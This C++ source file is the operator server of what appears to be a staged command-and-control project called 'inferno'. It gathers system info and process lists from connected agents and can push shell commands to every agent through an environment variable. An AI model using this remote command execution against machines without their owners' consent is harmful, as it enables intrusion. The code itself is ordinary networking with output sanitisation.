#include "../include/server.hpp"
#include <iostream>
#include <algorithm> // To use std::remove_if
#include <iomanip>
#include <arpa/inet.h>
#include "../../common/include/Packet.hpp"

namespace inferno {


Server::Server() : m_port(0), m_running(false) {}

Server::Server(uint16_t port) : m_port(port), m_running(false) {}

Server::~Server() {
    stop();
}

// Core functionalities

bool Server::start() {
    // Bind the listening socket to the specified IP and port
    if (!m_listen_socket.bindNode("0.0.0.0", m_port)) {
        std::cerr << "[Server] bindNode() failed on port " << m_port << "\n";
        return false;
    }

    // Put the listening socket in listening mode
    if (!m_listen_socket.listen()) {
        std::cerr << "[Server] listen() failed\n";
        return false;
    }

    m_running = true;
    std::cout << "[Server] Listening on port " << m_port << std::endl;
    return true;
}

void Server::run() {
    if (!m_running) {
        std::cerr << "[Server] Call start() before run()\n";
        return;
    }

    while (m_running) {

        // Build the fd_set
        // fd_set is the set of file descriptors that select() will monitor.
        // We rebuild it at each turn because select() modifies it.

        fd_set read_fds;
        FD_ZERO(&read_fds); // Clear the set

        // Add the listening socket to the set
        FD_SET(m_listen_socket.getFd(), &read_fds);
        int max_fd = m_listen_socket.getFd(); // select() needs the largest fd

        // Add all connected clients to the set
        for (const auto& client : m_clients) {
            FD_SET(client.socket.getFd(), &read_fds);
            if (client.socket.getFd() > max_fd)
                max_fd = client.socket.getFd();
        }

        // Call select()
        struct timeval timeout;
        timeout.tv_sec  = 1;
        timeout.tv_usec = 0;

        int activity = ::select(max_fd + 1, &read_fds, nullptr, nullptr, &timeout);

        if (activity < 0) {
            std::cerr << "[Server] select() error\n";
            break;
        }

        // New client connection
        if (FD_ISSET(m_listen_socket.getFd(), &read_fds)) {
            auto new_socket = m_listen_socket.acceptNode();
            if (new_socket.has_value()) {
                std::cout << "[Server] New agent connected: "
                          << new_socket->getIp() << ":"
                          << new_socket->getPort() << std::endl;
                
                // Immediately request system info (Phase 3 requirement)
                Packet req(static_cast<uint16_t>(Opcode::SYS_REQ_INFO), "");
                std::vector<uint8_t> data = req.serialize();
                new_socket->sendData(data);

                m_clients.push_back({std::move(*new_socket), {}});
            }
        }

        // Existing client data
        std::vector<int> to_remove;
        for (auto& client : m_clients) {
            if (FD_ISSET(client.socket.getFd(), &read_fds)) {
                std::vector<uint8_t> raw_chunk;
                ssize_t bytes = client.socket.receiveData(raw_chunk, 4096);

                if (bytes <= 0) {
                    std::cout << "[Server] Agent " << client.socket.getIp() << " disconnected" << std::endl;
                    to_remove.push_back(client.socket.getFd());
                } else {
                    // Accumulate data
                    client.buffer.insert(client.buffer.end(), raw_chunk.begin(), raw_chunk.end());
                    
                    // Option B: Offload processing to a dedicated method
                    processPacketBuffer(client);
                }
            }
        }

        // Clean up disconnected clients
        m_clients.erase(
            std::remove_if(m_clients.begin(), m_clients.end(),
                [&to_remove](const ClientContext& ctx) {
                    return std::find(to_remove.begin(), to_remove.end(), ctx.socket.getFd())
                           != to_remove.end();
                }),
            m_clients.end()
        );
    }
}

void Server::stop() {
    m_running = false;
    m_clients.clear(); 
}

// Getters

bool     Server::isRunning() const { return m_running; }
uint16_t Server::getPort()   const { return m_port; }

// Static Protocol Helper (Option B)
void Server::processPacketBuffer(ClientContext& client) {
    while (true) {
        auto packet_opt = ::inferno::Packet::deserialize(client.buffer);
        if (!packet_opt.has_value()) {
            break; // Not enough data for a full packet yet
        }

        // Dispatch Packet
        uint16_t opcode = packet_opt->getOpcode();
        const auto& payload = packet_opt->getPayload();
        std::string payload_str(payload.begin(), payload.end());

        if (opcode == static_cast<uint16_t>(Opcode::SYS_RES_INFO)) {
            std::cout << "[Server] [INFO] Agent " << client.socket.getIp() 
                      << " Specs: " << payload_str << std::endl;
            
            // After handshake: request process list (Circle 3)
            Packet req(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
            client.socket.sendData(req.serialize());

            // Test-only bootstrap command — disabled by default.
            // Set INFERNO_BOOTSTRAP_CMD=<cmd> before launching the server to trigger
            // a shell command on every agent handshake (for integration testing only).
            // In Circle 4 this entire block is replaced by the Qt GUI operator interface.
            const char* bootstrap_cmd = std::getenv("INFERNO_BOOTSTRAP_CMD");
            if (bootstrap_cmd && *bootstrap_cmd) {
                const std::string cmd(bootstrap_cmd);
                std::vector<uint8_t> cmd_payload;
                const uint16_t cmd_len = static_cast<uint16_t>(cmd.size());
                cmd_payload.push_back(static_cast<uint8_t>((cmd_len >> 8) & 0xFF));
                cmd_payload.push_back(static_cast<uint8_t>(cmd_len & 0xFF));
                cmd_payload.insert(cmd_payload.end(), cmd.begin(), cmd.end());
                Packet cmd_req(static_cast<uint16_t>(Opcode::CMD_EXEC),
                               std::string(cmd_payload.begin(), cmd_payload.end()));
                client.socket.sendData(cmd_req.serialize());
            }

        } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_RES)) {
            printProcessList(client.socket.getIp(), payload_str);
        } else if (opcode == static_cast<uint16_t>(Opcode::CMD_RES)) {
            printShellOutput(client.socket.getIp(), payload_str);
        } else {
            std::cout << "[Server] Received Opcode " << opcode 
                      << " from " << client.socket.getIp() << std::endl;
        }

        // Remove processed bytes from the buffer
        size_t packet_size = sizeof(PacketHeader) + payload.size();
        client.buffer.erase(client.buffer.begin(), client.buffer.begin() + packet_size);
    }
}

void Server::printProcessList(const std::string& ip, const std::string& payload) {
    if (payload.size() < 5) return;

    // 1. Parse Header
    uint16_t page_index = ntohs(*(reinterpret_cast<const uint16_t*>(payload.data())));
    uint8_t is_last = static_cast<uint8_t>(payload[2]);
    uint16_t entries = ntohs(*(reinterpret_cast<const uint16_t*>(payload.data() + 3)));

    std::cout << "\n" << std::setfill('=') << std::setw(60) << "" << std::endl;
    std::cout << "[Server] Process List Page " << page_index << " from " << ip << std::endl;
    std::cout << std::setfill('-') << std::setw(60) << "" << std::endl;
    std::cout << std::left << std::setw(10) << "PID" << " | " << "Process Name" << std::endl;
    std::cout << std::setfill('-') << std::setw(60) << "" << std::endl;

    // 2. Parse Entries
    size_t offset = 5;
    for (uint16_t i = 0; i < entries; i++) {
        if (offset + 6 > payload.size()) break;

        uint32_t pid = ntohl(*(reinterpret_cast<const uint32_t*>(payload.data() + offset)));
        uint16_t name_len = ntohs(*(reinterpret_cast<const uint16_t*>(payload.data() + offset + 4)));
        offset += 6;

        if (offset + name_len > payload.size()) break;
        std::string name(payload.data() + offset, name_len);
        offset += name_len;

        std::cout << std::left << std::setw(10) << pid << " | " << name << std::endl;
    }

    std::cout << std::setfill('=') << std::setw(60) << "" << std::endl;
    if (is_last) {
        std::cout << "[Server] Final Page Received. Discovery Complete.\n" << std::endl;
    }
}

void Server::printShellOutput(const std::string& ip, const std::string& payload) {
    // CMD_RES layout: [status: uint8][data_len: uint16][data: char[]]
    if (payload.size() < 3) return;

    // Sanitize output before printing to the operator's terminal.
    // A compromised agent could embed ANSI escape sequences (e.g. \x1b[2J to clear the
    // screen, or \x1b]0; to change the terminal title) to manipulate the operator's view.
    // This filter strips all control characters except whitespace (\n, \r, \t) and
    // printable ASCII (0x20–0x7E). Raw bytes on the wire are NOT affected.
    // NOTE: In Circle 5, raw bytes will be stored unmodified in the PostgreSQL database.
    auto sanitize = [](const std::string& s, size_t offset, size_t len) -> std::string {
        std::string out;
        out.reserve(len);
        for (size_t i = offset; i < offset + len && i < s.size(); ++i) {
            const unsigned char c = static_cast<unsigned char>(s[i]);
            if (c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c != 0x7F)) {
                out.push_back(static_cast<char>(c));
            }
        }
        return out;
    };

    const uint8_t  status   = static_cast<uint8_t>(payload[0]);
    const uint16_t data_len = (static_cast<uint16_t>(static_cast<uint8_t>(payload[1])) << 8)
                            |  static_cast<uint16_t>(static_cast<uint8_t>(payload[2]));

    if (status == 0) {
        // Data chunk — print directly without separator
        if (payload.size() >= static_cast<size_t>(3 + data_len)) {
            std::cout << sanitize(payload, 3, data_len) << std::flush;
        }
    } else if (status == 1) {
        // Last chunk — flush any remaining data, then print separator
        if (data_len > 0 && payload.size() >= static_cast<size_t>(3 + data_len)) {
            std::cout << sanitize(payload, 3, data_len);
        }
        std::cout << "\n" << std::setfill('-') << std::setw(60) << ""
                  << "\n[Server] Shell command from " << ip << " completed.\n"
                  << std::setfill('=') << std::setw(60) << "" << "\n" << std::endl;
    } else {
        // status == 2: error
        std::cerr << "[Server] Shell error from " << ip << ": "
                  << sanitize(payload, 3, data_len) << std::endl;
    }
}

} // namespace inferno